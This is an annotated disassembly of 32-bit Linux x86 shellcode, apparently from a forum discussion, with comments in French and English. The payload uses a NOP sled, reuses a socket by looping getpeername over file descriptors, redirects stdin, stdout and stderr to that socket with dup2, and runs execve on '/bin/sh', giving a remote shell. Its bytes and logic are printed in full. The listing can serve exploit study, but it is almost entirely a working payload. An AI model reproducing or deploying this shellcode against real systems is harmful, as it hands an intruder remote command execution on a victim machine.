/
                 // ram 
                 // ram: 00000000-000000d5
                 //
        assume DF = 0x0  (Defaul
   000000 90       NOP
   000001 90       NOP
   000002 90       NOP
   000003 90       NOP
   000004 90       NOP
   000005 90       NOP
   000006 90       NOP
   000007 90       NOP
   000008 90       NOP
   000009 90       NOP
   00000a 90       NOP
   00000b 90       NOP
   00000c 90       NOP
   00000d 90       NOP
   00000e 90       NOP
   00000f 90       NOP
   000010 90       NOP
   000011 90       NOP
   000012 90       NOP
   000013 90       NOP
   000014 90       NOP
   000015 90       NOP
   000016 90       NOP
   000017 90       NOP
   000018 90       NOP
   000019 90       NOP
   00001a 90       NOP
   00001b 90       NOP
   00001c 90       NOP
   00001d 90       NOP
   00001e 90       NOP
   00001f 90       NOP
   000020 90       NOP
   000021 90       NOP
   000022 90       NOP
   000023 90       NOP
   000024 90       NOP
   000025 90       NOP
   000026 90       NOP
   000027 90       NOP
   000028 90       NOP
   000029 90       NOP
   00002a 90       NOP
   00002b 90       NOP
   00002c 90       NOP
   00002d 90       NOP
   00002e 90       NOP
   00002f 90       NOP
   000030 90       NOP
   000031 90       NOP
   000032 90       NOP
   000033 90       NOP
   000034 90       NOP
   000035 90       NOP
   000036 90       NOP
   000037 90       NOP
   000038 90       NOP
   000039 90       NOP
   00003a 90       NOP
   00003b 90       NOP
   00003c 90       NOP
   00003d 90       NOP
   00003e 90       NOP
   00003f 90       NOP
   000040 eb 71    JMP    main::start_jmp
                 **********************************
                 *             FUNCTION             *
                 **********************************
                 int __cdecl main(int argc, char *
        int        EAX:4    <RETURN>
        int        Stack[0  argc
        char * *   Stack[0  argv
                 main                        XREF[1  000000b3(c)  
   000042 5d       POP    EBP                         EPB = address instr
                                                      000000b8
   000043 31 c0    XOR    EAX,EAX                     set 0
   000045 31 db    XOR    EBX,EBX                     set 0
   000047 31 c9    XOR    ECX,ECX                     set 0
   000049 31 d2    XOR    EDX,EDX                     set 0
   00004b 31 ff    XOR    EDI,EDI                     set 0
   00004d 31 f6    XOR    ESI,ESI                     set 0
   00004f b0 22    MOV    AL,0x22                     EAX = 0x22 (0010 00
   000051 89 c6    MOV    ESI,EAX                     copy EAX to ESI
                                                      ESI = 0x22 (0010 00
   000053 b0 c0    MOV    AL,0xc0                     EAX = 0xc0 (1100 00
   000055 b1 01    MOV    CL,0x1                      ECX = 0x1 (0001)
   000057 66 c1    SHL    CX,0xc                      ECX = 0x1000 (1 000
          e1 0c
   00005b b2 03    MOV    DL,0x3                      EDX = 0x3 (0011)
   00005d 4f       DEC    EDI                         EDI -= 1
   00005e cd 80    INT    0x80                        appel sys 192 - mmap
                 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
                 ---
                 EBX - 0
                 ECX - 4096 0x1000 2^12
                 EDX - 3 - PROT_READ | PROT_WRITE
                 ---
                 return pointer of new zone in EAX
   000060 89 c1    MOV    ECX,EAX                     ECX - pointer on zo
                                                      ECX = &zone_mmap
   000062 31 ff    XOR    EDI,EDI                     EDI = 0
   000064 b3 02    MOV    BL,0x2                      EBX = 0x2 (2)
   000066 89 ca    MOV    EDX,ECX                     EDX copy of ECX - p
                                                      EDX = &zone_mmap
   000068 80 c1    ADD    CL,0x4                      ECX = &zone_mmap + 4
          04
                 try_every_fd_values_while_n XREF[2  0000007c(j), 
                                                    00000082(j)  
   00006b 31 c0    XOR    EAX,EAX                     EAX = 0
   00006d 66 b8    MOV    AX,0x170                    EAX = 0x170 (368)
          70 01
   000071 fe c3    INC    BL                          EBX += 1
   000073 c6 02    MOV    byte ptr [EDX],0x10         store 0x10 at [EDX]
          10
   000076 89 39    MOV    dword ptr [ECX],EDI         store EDI at [ECX] 
   000078 cd 80    INT    0x80                        appel sys 368 - get
                 int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
                 ---
                 get peer address
                 ---
                 EBX - increment from 0x2
                 ECX - &zone_mmap + 4 (pointer where to write peer address)
                 EDX - [&zone_mmap] = 0x10 (16) - peer address as a max len of 16 bytes (128), truncated if longer
                 ---
                 ECX = address of the peer connected to the socket sockfd (EBX)
                 return 0 on success, -1 on error
   00007a 39 f8    CMP    EAX,EDI                     EAX == EDI ?
   00007c 75 ed    JNZ    try_every_fd_values_while_n if error at syscall
   00007e 8b 01    MOV    EAX,dword ptr [ECX]         EAX = peer address 
   000080 3c 02    CMP    AL,0x2                      AL == 2 ? (is ipv4 
   000082 75 e7    JNZ    try_every_fd_values_while_n if EAX do not end w
   000084 89 ca    MOV    EDX,ECX                     EDX = ECX (&zone_mm
                                                      peer address is sto
   000086 31 c9    XOR    ECX,ECX                     ECX = 0
   000088 31 c0    XOR    EAX,EAX                     EAX = 0
   00008a b0 3f    MOV    AL,0x3f                     EAX = 0x3f (0011 11
   00008c cd 80    INT    0x80                        appel sys 63 - dup2
                 int dup2(int oldfd, int newfd);
                 ---
                 copy file descriptor
                 ---
                 EBX - oldfd found using try_every_fd_values_while_not_error loop
                 ECX - &zone_mmap + 4
                 ---
                 return new descriptor on success, -1 on error
   00008e 41       INC    ECX                         ECX += 1
   00008f b0 3f    MOV    AL,0x3f                     EAX = 0x3f (0011 11
   000091 cd 80    INT    0x80                        appel sys 63 - dup2
                 int dup2(int oldfd, int newfd);
                 ---
                 copy file descriptor
                 ---
                 EBX - oldfd found using try_every_fd_values_while_not_error loop
                 ECX - &zone_mmap + 5
                 ---
                 return new descriptor on success, -1 on error
   000093 41       INC    ECX                         ECX += 1
   000094 b0 3f    MOV    AL,0x3f                     EAX = 0x3f (0011 11
   000096 cd 80    INT    0x80                        appel sys 63 - dup2
                 int dup2(int oldfd, int newfd);
                 ---
                 copy file descriptor
                 ---
                 EBX - oldfd found using try_every_fd_values_while_not_error loop
                 ECX - &zone_mmap + 6
                 ---
                 return new descriptor on success, -1 on error
   000098 31 c0    XOR    EAX,EAX                     EAX = 0
   00009a 89 6d    MOV    dword ptr [EBP + 0x8],EBP   [EBP + 0x8] = EBP
          08                                          b8 + 0x8 = 0xc0
   00009d 89 45    MOV    dword ptr [EBP + 0xc],EAX   [EBP + 0xc] = 0x0
          0c                                          b8 + 0xc = 0xc0
   0000a0 88 45    MOV    byte ptr [EBP + 0x7],AL     make [EBP + 0x7] en
          07                                          b8 + 0x7 = 0xbf
   0000a3 b0 0b    MOV    AL,0xb                      EAX = 0xb (1011)
   0000a5 89 eb    MOV    EBX,EBP                     EBX = EBP (/bin/sh)
   0000a7 8d 4d    LEA    ECX,[EBP + 0x8]             ECX = [EBP + 0x8]
          08
   0000aa 8d 55    LEA    EDX,[EBP + 0xc]             EDX = [EBP + 0xc]
          0c
   0000ad cd 80    INT    0x80                        appel sys 11 - exec
                 int execve(const char *filename, char *const argv[], char *const envp[]);
                 ---
                 EBX - pointer on value /bin/sh
                 ECX - pointer on value ["/bin/sh"] array ends with 0
                 EDX - pointer on value 0
                 /bin/sh/0(@"/bin/sh/")00000000
   0000af b0 01    MOV    AL,0x1                      EAX = 0x1
   0000b1 cd 80    INT    0x80                        appel sys 1 - exit
                 start_jmp                   XREF[1  00000040(j)  
   0000b3 e8 8a    CALL   main                        int main(int argc, 
          ff ff 
          ff
   0000b8 2f 62    ds     "/bin/shAAAAAAAAA\n"
          69 6e 
          2f 73
   0000cc 0d 00    OR     EAX,0x8b000000
          00 00 
          8b
                 1000 1011 0000 0000 0000 0000 0000 0000 (32 bits)
   0000d1 91       XCHG   EAX,ECX
   0000d2 98       CWDE
   0000d3 c3       RET
   0000d4 ff 0a    DEC    dword ptr [EDX]


Fin de la discussion
Écrivez un message...

